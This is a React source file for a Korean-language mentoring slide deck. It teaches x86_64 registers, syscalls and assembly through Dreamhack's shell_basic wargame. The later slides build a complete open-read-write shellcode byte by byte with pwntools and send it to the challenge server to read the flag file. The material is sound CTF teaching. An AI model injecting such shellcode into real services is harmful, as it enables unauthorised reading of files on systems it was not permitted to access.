import { MarkdownSlides } from "@/components/markdown-slides";

const slides = [
  `# 4주차. ORW 셸코드와 shell_basic 분석
  <br>

  지난 주차에 소개한 shell_basic 문제를 이어서, 셸코드와 레지스터/어셈블리 기초를 정리한 뒤 ORW 셸코드를 직접 분석합니다.
  <br>
  <br>

  ## 목표
  <br>
  
  - x86_64 레지스터와 syscall 호출 규약 이해
  - 셸코드가 어떻게 바이트 코드로 실행되는지 이해
  - ORW 셸코드 동작 원리 이해`,

  `# 오늘 멘토링 내용
  <br>

  ## shell_basic 문제 소개
  <br>

  ## 셸코드 기초
  <br>

  ## ORW 셸코드
  <br>

  ## x86_64 레지스터 / syscall
  <br>

  ## 어셈블리 언어 기초
  <br>

  ## 코드 분석 1 — 파일명을 스택에 올리기
  <br>

  ## 코드 분석 2 — syscall로 파일 읽고 출력하기`,

  `# shell_basic 문제
  <br>

  ## 문제 소개
  <br>

  - **[shell_basic (링크)](https://dreamhack.io/wargame/challenges/410)** — 드림핵 셸코드 입문 문제
  - 서버에 셸코드를 전송하면 그대로 실행함
  - 목표: 서버의 \`/home/shell_basic/flag_name_is_loooooong\` 파일을 읽어 flag 획득

  <br>

  ## 필요한 개념
  <br>

  - 셸코드(Shellcode)란 무엇인가
  - x86_64 레지스터 구조
  - 어셈블리 언어 기초
  - ORW(Open-Read-Write) 셸코드`,

  `# 셸코드란?
  <br>

  ## Shellcode
  <br>

  - CPU가 직접 실행할 수 있는 **기계어(바이트) 코드**
  - 보통 취약점을 통해 메모리에 주입한 뒤 실행시킴
  - 이름의 유래: 초기에는 주로 \`/bin/sh\` 셸을 띄우는 용도였기 때문

  \`\`\`python
  # 셸코드를 bytes로 직접 조립
  shellcode = b""
  shellcode += b"\\x48\\xb8" + p64(val)   # mov rax, <값>
  shellcode += b"\\x50"                   # push rax
  # ...
  \`\`\``,

  `# 셸코드란?
  <br>

  ## 어셈블리 → 바이트 변환
  <br>

  - CPU는 어셈블리 문자열을 모름 → 실제로는 **1바이트씩 된 숫자(opcode)**를 실행
  - 어셈블러(assembler)가 어셈블리 명령어를 바이트로 변환해 줌

  | 어셈블리 | 바이트 | 설명 |
  |----------|--------|------|
  | \`mov rax, <값>\` | \`\\x48 \\xb8\` + 8바이트 | \`\\x48\` = REX.W (64비트 모드), \`\\xb8\` = MOV RAX opcode |
  | \`push rax\` | \`\\x50\` | PUSH RAX opcode |
  | \`xor rsi, rsi\` | \`\\x48 \\x31 \\xf6\` | REX.W + XOR opcode + rsi/rsi 피연산자 |
  | \`syscall\` | \`\\x0f \\x05\` | 커널 진입 opcode (항상 2바이트 고정) |

  <br>

  > \`\\x48\` (REX.W prefix) : x86_64에서 레지스터를 64비트로 쓰겠다는 신호
  > 이 prefix가 없으면 32비트 레지스터(\`eax\`, \`esi\` 등)로 동작`,

  `# 셸코드란?
  <br>

  ## 문제 해결 흐름
  <br>

  \`\`\`
  Python으로 shellcode 조립
        ↓
  pwntools remote()로 서버 전송
        ↓
  서버가 shellcode를 메모리에 올리고 실행
        ↓
  flag 파일을 읽어서 출력
  \`\`\``,

  `# 왜 ORW인가?
  <br>

  ## 이 문제에서 필요한 것은 "쉘 획득"이 아니라 "파일 읽기"
  <br>

  - 쉘 획득이 불가능함 : execve("/bin/sh") 같은 syscall이 불가능
  - 목표가 명확함 : \`/home/shell_basic/flag_name_is_loooooong\` 내용을 읽어서 출력

  → ORW 셸코드를 이용해야 함
  
  <br>

  ## 실전/문제풀이 관점
  <br>

  - 셸 획득형 셸코드는 \`execve("/bin/sh")\` 같은 추가 syscall이 필요함
  - ORW는 파일 경로만 알면 바로 flag를 꺼낼 수 있음
  - 문제의 상황에 따라서 적절한 셸코드를 사용해야 함`,

  `# ORW 셸코드
  <br>

  ## Open → Read → Write
  <br>

  \`\`\`
  open("/path/to/flag", O_RDONLY)  →  fd (파일 디스크립터) 반환
       ↓
  read(fd, buf, size)              →  파일 내용을 메모리(buf)에 읽어옴
       ↓
  write(1, buf, size)              →  buf 내용을 stdout(fd=1)으로 출력
  \`\`\``,

  `# x86_64 레지스터
  <br>

  ## 이 문제에서 꼭 보는 레지스터
  <br>

  | 레지스터 | shell_basic / ORW에서의 역할 |
  |----------|-----------|
  | \`rax\` | syscall 번호 / syscall 반환값 |
  | \`rdi\` | 1번째 인자 |
  | \`rsi\` | 2번째 인자 |
  | \`rdx\` | 3번째 인자 |
  | \`rsp\` | 스택 포인터 (현재 스택 최상단 주소) |
  | \`rip\` | 다음에 실행할 명령어 주소 |

  <br>

  예시:
  - \`open\` 직전: \`rax=2\`, \`rdi=파일명 주소\`, \`rsi=0\`
  - \`read\` 직전: \`rax=0\`, \`rdi=fd\`, \`rsi=버퍼 주소\`, \`rdx=200\`
  - \`write\` 직전: \`rax=1\`, \`rdi=1\`, \`rsi=버퍼 주소\`, \`rdx=읽은 바이트 수\``,

  `# x86_64 레지스터
  <br>

  ## 커널(Kernel)이란?
  <br>

  - OS의 핵심으로, 하드웨어(CPU, 메모리, 디스크 등)를 직접 제어하는 소프트웨어
  - 일반 프로그램은 하드웨어에 **직접 접근할 수 없음** → 커널에 요청해야 함

  <br>

  ## syscall이란?
  <br>

  - 일반 프로그램이 커널에 서비스를 요청하는 **유일한 공식 창구**
  - 파일 읽기/쓰기, 프로세스 생성, 네트워크 연결 등 모두 syscall을 통해 처리

  \`\`\`
  [일반 프로그램]  →  syscall  →  [커널]  →  하드웨어
  \`\`\`

  <br>

  ## 호출 규약 (x86_64)
  <br>

  \`\`\`
  rax = syscall 번호   (어떤 기능을 요청할지)
  rdi = 1번째 인자
  rsi = 2번째 인자
  rdx = 3번째 인자
  → syscall 명령어 실행
  \`\`\``,

  `# x86_64 레지스터
  <br>

  ## syscall이 끝나면 rax를 다시 봐야 함
  <br>

  - \`rax\` 는 syscall 전에는 "번호"지만, syscall 후에는 **반환값**으로 바뀜
  - ORW에서는 이 반환값을 다음 syscall 인자로 계속 넘겨 줌

  | 단계 | syscall 전 rax | syscall 후 rax |
  |------|----------------|----------------|
  | \`open\` | 2 | 열린 파일의 fd |
  | \`read\` | 0 | 실제로 읽은 바이트 수 |
  | \`write\` | 1 | 실제로 출력한 바이트 수 |

  <br>

  - ORW에서 **\`rax\` 값이 다음 단계로 어떻게 이어지는지**를 보면 됨`,

  `# x86_64 레지스터
  <br>

  ## syscall이 실패하면?
  <br>

  - syscall이 성공하면 \`rax\` 에 정상 결과가 들어감
  - syscall이 실패하면 보통 \`rax\` 에 **음수 에러 코드**가 들어감
  - 입문 단계에서는 에러 번호를 외우기보다, "**기대한 fd/길이가 안 나오면 직전 syscall을 의심한다**"가 더 중요함

  \`\`\`
  open 실패  →  rax = 음수
  read 실패  →  rax = 음수
  write 실패 →  rax = 음수
  \`\`\`

  - 따라서 \`rax\` 는 "다음 인자에 넘길 값"이면서 동시에 **디버깅 포인트**이기도 함`,

  `# x86_64 레지스터
  <br>

  ## 왜 \`mov eax, 2\` 나 \`mov edi, 1\` 를 쓰나?
  <br>

  - x86_64에서 \`eax\` 는 \`rax\` 의 하위 32비트, \`edi\` 는 \`rdi\` 의 하위 32비트
  - 32비트 레지스터에 값을 쓰면 상위 32비트가 자동으로 0이 됨
  - 그래서 작은 상수는 \`mov rax, 2\` 보다 \`mov eax, 2\` 가 더 짧고 자주 쓰임

  \`\`\`asm
  mov eax, 2    ; rax = 0x0000000000000002
  mov edi, 1    ; rdi = 0x0000000000000001
  \`\`\`

  - 셸코드는 보통 **짧은 바이트 길이**가 중요해서 이런 표현을 선호`,

  `# 어셈블리 언어 기초
  <br>

  ## 주요 명령어
  <br>

  | 명령어 | 설명 | 예시 |
  |--------|------|------|
  | \`mov dst, src\` | src 값을 dst에 저장 | \`mov rax, 2\` |
  | \`push src\` | rsp를 8 감소시키고 src를 스택에 저장 | \`push rax\` |
  | \`pop dst\` | 스택에서 값을 꺼내 dst에 저장 | \`pop rdi\` |
  | \`xor dst, src\` | dst = dst XOR src (0으로 초기화할 때 자주 씀) | \`xor rsi, rsi\` |
  | \`syscall\` | 커널에 시스템 콜 요청 | \`syscall\` |

  <br>

  ## 예시 — rax를 0으로 초기화
  <br>

  \`\`\`asm
  xor rax, rax   ; rax = rax XOR rax = 0
                 ; mov rax, 0 보다 바이트 수가 적음 → 셸코드에서 선호
  \`\`\``,

  `# 어셈블리 언어 기초
  <br>

  ## push / pop 와 스택
  <br>

  \`\`\`
  [ push rax ]   rax = 0x4141  →  rsp가 8 감소하고 값을 스택에 저장

  실행 전                         실행 후
        0x7fec [ ???????? ]             0x7fec [ ???????? ] 
        0x7ff4 [ ???????? ]      rsp →  0x7ff4 [ 0x4141   ]  ← push된 값
  rsp → 0x7ffc [ ???????? ]             0x7ffc [ ???????? ]
  \`\`\`

  <br>

  \`\`\`
  [ pop rdi ]   스택 최상단 값을 rdi에 저장하고 rsp가 8 증가

  실행 전                         실행 후
        0x7fec [ ???????? ]            0x7fec [ ???????? ]  
  rsp → 0x7ff4 [ 0x4141   ]            0x7ff4 [ ???????? ]
        0x7ffc [ ???????? ]      rsp → 0x7ffc [ ???????? ]
                                 rdi = 0x4141
  \`\`\`

  - 스택은 **높은 주소 → 낮은 주소** 방향으로 자람
  - \`push\` 할수록 rsp는 감소, \`pop\` 할수록 rsp는 증가`,

  `# 어셈블리 언어 기초
  <br>

  ## \`rsp\` 는 데이터가 아니라 "주소"
  <br>

  - 스택에 문자열을 push 해 두면, 그 문자열은 메모리 어딘가에 저장됨
  - \`rsp\` 는 그 문자열 자체가 아니라 **문자열이 시작하는 메모리 주소**
  - 그래서 \`mov rdi, rsp\` 는 "문자열을 복사"가 아니라 **"문자열 주소를 인자로 넘김"** 이라는 뜻

  \`\`\`
  rsp ──▶ "/home/shell_basic/flag..."
  \`\`\`

  - \`open\` 은 파일명 바이트 자체가 아니라, **파일명 문자열이 있는 주소**를 받음`,

  `# Linux syscall 번호
  <br>

  ## x86_64 기준
  <br>

  | syscall | 번호 (rax) | rdi | rsi | rdx |
  |---------|-----------|-----|-----|-----|
  | \`read\`  | 0 | fd | buf | size |
  | \`write\` | 1 | fd | buf | size |
  | \`open\`  | 2 | filename | flags | - |

  - stdin의 fd = **0**
  - \`O_RDONLY = 0\` (읽기 전용)
  - stdout의 fd = **1**, stderr의 fd = **2**`,

  `# 코드 분석 1
  <br>

  ## 왜 8바이트씩 끊고 역순으로 push 하나?
  <br>

  - \`push rax\` 는 한 번에 8바이트를 스택에 올림
  - 스택은 **높은 주소 → 낮은 주소** 로 자라므로, 문자열을 메모리에 정방향으로 남기려면 **뒤 청크부터 먼저 push** 해야 함
  - 여기서 8바이트 패딩은 syscall 요구사항이 아니라, \`u64()\` 로 깔끔하게 끊어 조립하기 위한 구현 편의

  <br>

  예시: \`b"/bin/sh\\x00"\`

  \`\`\`python
  chunk = b"/bin/sh\\x00"
  val = u64(chunk)          # 리틀엔디안 정수로 해석
  shellcode += b"\\x48\\xb8" + p64(val)
  shellcode += b"\\x50"     # push rax
  \`\`\`

  - 레지스터 안의 "정수값"과 메모리에 놓이는 "바이트 순서"를 구분해서 봐야 함`,

  `# 코드 분석 1
  <br>

  ## 리틀엔디안 때문에 헷갈리는 지점
  <br>

  \`\`\`
  chunk = b"/bin/sh\\x00"

  바이트 나열:
  2f 62 69 6e 2f 73 68 00

  u64(chunk) 로 본 정수:
  0x0068732f6e69622f
  \`\`\`

  - 숫자로 보면 뒤집혀 보이지만, \`p64(val)\` 로 다시 바이트로 만들면 원래 바이트열로 복원됨
  - 그래서 \`u64(chunk)\` 로 정수화한 뒤 \`mov rax, <값>\` 하고 \`push rax\` 하면 메모리에는 다시 \`/bin/sh\\x00\` 가 놓임
  - 즉 **정수 표기와 메모리 바이트 순서를 섞어 생각하면 안 됨**`,

  `# 코드 분석 1
  <br>

  ## 파일명을 스택에 올리기
  <br>

  \`\`\`python
  filepath = b"/home/shell_basic/flag_name_is_loooooong\\x00"

  # 8바이트씩 분할 후 역순으로 push (스택은 높은 주소 → 낮은 주소로 쌓임)
  while len(filepath) % 8 != 0:
      filepath += b"\\x00"              # 8바이트 정렬을 위한 패딩

  chunks = [filepath[i:i+8] for i in range(0, len(filepath), 8)]
  chunks.reverse()

  for chunk in chunks:
      val = u64(chunk)
      shellcode += b"\\x48\\xb8" + p64(val)   # mov rax, <8바이트 값>
      shellcode += b"\\x50"                   # push rax
  \`\`\``,

  `# 코드 분석 1
  <br>

  ## push 완료 후 메모리 모습
  <br>

  \`\`\`
  스택 (낮은 주소 ↑)
  ┌─────────────────────┐  ← rsp (push 완료 후)
  │  /home/shell_basic/ │
  │  flag_name_is_looo  │
  │  oooong\\x00\\x00\\x00 │
  └─────────────────────┘
  \`\`\`

  - \`chunks.reverse()\` 를 하지 않으면 문자열 순서가 거꾸로 쌓여 \`open\` 이 올바른 경로를 읽지 못함`,

  `# 코드 분석 2
  <br>

  ## 1단계: open + read
  <br>

  \`\`\`python
  # open(rsp, O_RDONLY)  →  rax = fd
  shellcode += b"\\x48\\x89\\xe7"          # mov rdi, rsp  (파일명 주소)
  shellcode += b"\\x48\\x31\\xf6"          # xor rsi, rsi  (O_RDONLY = 0)
  shellcode += b"\\x48\\x31\\xd2"          # xor rdx, rdx
  shellcode += b"\\xb8\\x02\\x00\\x00\\x00" # mov eax, 2    (open)
  shellcode += b"\\x0f\\x05"              # syscall

  # read(fd, rsp, 200)  →  파일 내용을 스택에 읽어옴
  shellcode += b"\\x48\\x89\\xc7"          # mov rdi, rax  (fd)
  shellcode += b"\\x48\\x89\\xe6"          # mov rsi, rsp  (buf = rsp)
  shellcode += b"\\xba\\xc8\\x00\\x00\\x00" # mov edx, 200
  shellcode += b"\\x48\\x31\\xc0"          # xor rax, rax  (read = 0)
  shellcode += b"\\x0f\\x05"              # syscall
  \`\`\`

  - \`open\` 후: \`rax = fd\`
  - \`read\` 후: \`rax = 실제 읽은 바이트 수\``,

  `# 코드 분석 2
  <br>

  ## 2단계: write
  <br>

  \`\`\`python
  # write(1, rsp, 실제 읽은 크기)  →  stdout으로 출력
  shellcode += b"\\x48\\x89\\xc2"          # mov rdx, rax  (읽은 바이트 수)
  shellcode += b"\\xbf\\x01\\x00\\x00\\x00" # mov edi, 1    (stdout)
  shellcode += b"\\x48\\x89\\xe6"          # mov rsi, rsp
  shellcode += b"\\xb8\\x01\\x00\\x00\\x00" # mov eax, 1    (write)
  shellcode += b"\\x0f\\x05"              # syscall
  \`\`\`

  - 그래서 \`mov rdx, rax\` 로 읽은 길이를 그대로 \`write\` 길이로 넘길 수 있음`,

  `# 코드 분석 2
  <br>

  ## 왜 \`rsp\` 를 파일명과 버퍼로 둘 다 써도 되나?
  <br>

  1. 먼저 스택에 파일 경로 문자열을 올림
  2. \`open(rsp, 0)\` 으로 커널에 "이 주소의 문자열을 파일명으로 사용"하라고 전달
  3. \`open\` 이 끝나면 커널은 파일명을 다 읽었고, 이제 우리에게 필요한 것은 **fd 값**
  4. 그 다음 \`read(fd, rsp, 200)\` 으로 같은 위치를 버퍼로 재사용

  <br>

  - 즉 파일명 문자열은 \`open\` 이후에는 역할이 끝나므로 덮어써도 됨
  - 셸코드는 공간이 매우 제한적일 수 있어서, 이런 **메모리 재사용**이 자주 등장함`,

  `# 코드 분석 2
  <br>

  ## 최종 ORW 코드에서 레지스터 흐름 추적
  <br>

  | 단계 | 핵심 명령 | 실행 뒤 핵심 상태 |
  |------|-----------|-------------------|
  | 파일명 준비 | \`mov rdi, rsp\` | \`rdi = 파일명 주소\` |
  | open 준비 | \`xor rsi, rsi\` | \`rsi = 0 = O_RDONLY\` |
  | open 실행 | \`mov eax, 2; syscall\` | \`rax = fd\` |
  | read 준비 | \`mov rdi, rax\` | \`rdi = fd\` |
  | read 버퍼 | \`mov rsi, rsp\` | \`rsi = 버퍼 주소\` |
  | read 실행 | \`xor rax, rax; syscall\` | \`rax = 읽은 바이트 수\` |
  | write 길이 | \`mov rdx, rax\` | \`rdx = 출력할 길이\` |
  | write fd | \`mov edi, 1\` | \`rdi = stdout\` |
  | write 실행 | \`mov eax, 1; syscall\` | stdout으로 flag 출력 |

  - 최종 익스플로잇은 바이트를 외우는 게 아니라, **레지스터 상태를 원하는 흐름으로 연결하는 과정**이라고 보면 됨`,

  `# 최종 익스플로잇
  <br>

  ## 1단계: 파일 경로를 push하는 셸코드 만들기
  <br>

  \`\`\`python
  from pwn import *

  path = b"/home/shell_basic/flag_name_is_loooooong\\x00"
  while len(path) % 8 != 0:
      path += b"\\x00"

  chunks = [path[i:i+8] for i in range(0, len(path), 8)]
  chunks.reverse()

  shellcode = b""

  for chunk in chunks:
      shellcode += b"\\x48\\xb8" + p64(u64(chunk))  # mov rax, <8바이트 값>
      shellcode += b"\\x50"                        # push rax
  \`\`\``,

  `# 최종 익스플로잇
  <br>

  ## 2단계: open + read + write 이어 붙이기
  <br>

  \`\`\`python
  shellcode += b"\\x48\\x89\\xe7"                  # mov rdi, rsp
  shellcode += b"\\x48\\x31\\xf6"                  # xor rsi, rsi
  shellcode += b"\\x48\\x31\\xd2"                  # xor rdx, rdx
  shellcode += b"\\xb8\\x02\\x00\\x00\\x00"        # mov eax, 2
  shellcode += b"\\x0f\\x05"                       # syscall

  shellcode += b"\\x48\\x89\\xc7"                  # mov rdi, rax
  shellcode += b"\\x48\\x89\\xe6"                  # mov rsi, rsp
  shellcode += b"\\xba\\xc8\\x00\\x00\\x00"        # mov edx, 200
  shellcode += b"\\x48\\x31\\xc0"                  # xor rax, rax
  shellcode += b"\\x0f\\x05"                       # syscall

  shellcode += b"\\x48\\x89\\xc2"                  # mov rdx, rax
  shellcode += b"\\xbf\\x01\\x00\\x00\\x00"        # mov edi, 1
  shellcode += b"\\x48\\x89\\xe6"                  # mov rsi, rsp
  shellcode += b"\\xb8\\x01\\x00\\x00\\x00"        # mov eax, 1
  shellcode += b"\\x0f\\x05"                       # syscall
  \`\`\`

  - 여기서 \`mov eax, 2\`, \`mov edi, 1\` 처럼 32비트 하위 레지스터를 써도 상위 비트가 0으로 채워지므로 문제 없음`,

  `# 최종 익스플로잇
  <br>

  ## 3단계: 문제 서버에 전송하고 출력 받기
  <br>

  \`\`\`python
  r = remote("<host>", <port>)
  r.recvuntil(b"shellcode: ")
  r.send(shellcode)
  print(r.recvall().decode(errors="ignore"))
  \`\`\``,

  `# 최종 익스플로잇
  <br>

  ## \`send()\` 와 \`sendline()\` 중 무엇을 써야 하나?
  <br>

  - 셸코드는 텍스트가 아니라 **raw bytes**
  - 따라서 보통은 끝에 줄바꿈을 강제로 붙이지 않는 \`send()\` 가 더 안전함
  - 서버가 "한 줄 입력"을 요구하는 구조라면 그때만 \`sendline()\` 을 고려

  <br>

  ## 문제를 풀 때 체크할 것
  <br>

  - 프롬프트가 있다면 \`recvuntil()\` 로 동기화했는가
  - 파일 경로 끝에 \`\\x00\` 이 들어갔는가
  - 청크를 역순으로 push 했는가
  - \`read\` 뒤의 \`rax\` 를 \`write\` 길이로 넘겼는가`,

  `# 과제 1 — OverTheWire Bandit (필수)
  <br>

  - **[OverTheWire Bandit (링크)](https://overthewire.org/wargames/bandit/)**
  - SSH로 접속해서 리눅스 명령어를 계속 익히는 워게임
  - **Level 6 → Level 10** 까지 풀기

  \`\`\`bash
  # Level 6 접속 예시
  ssh bandit6@bandit.labs.overthewire.org -p 2220
  # 비밀번호: 이전 레벨에서 획득한 값
  \`\`\`

  - 각 레벨에서 다음 레벨 비밀번호를 찾으면 클리어
  - 모르는 명령어는 \`man <명령어>\` 로 확인`,

  `# 과제 2 — 셸코드 레지스터 흐름 따라가기 (선택)
  <br>

  - 이번 주차의 ORW 셸코드 또는 \`shell_basic\` 어셈블리 코드를 다시 보기
  - 각 줄에서 \`rax\`, \`rdi\`, \`rsi\`, \`rdx\`, \`rsp\` 값이 어떻게 바뀌는지 직접 적어 보기
  - 목표: "이 명령어가 왜 다음 syscall 인자가 되는지"를 설명할 수 있을 정도로 흐름 이해하기

  <br>

  - 권장 방식: \`open\` 직전 / \`open\` 직후 / \`read\` 직전 / \`read\` 직후 / \`write\` 직전 순서로 정리
  - 가능하면 각 명령어 옆에 "무슨 값을 옮겼는지" 한 줄씩 주석처럼 써 보기`,
];

export function Week4OrwShellcodeDeck() {
  return <MarkdownSlides slides={slides} />;
}
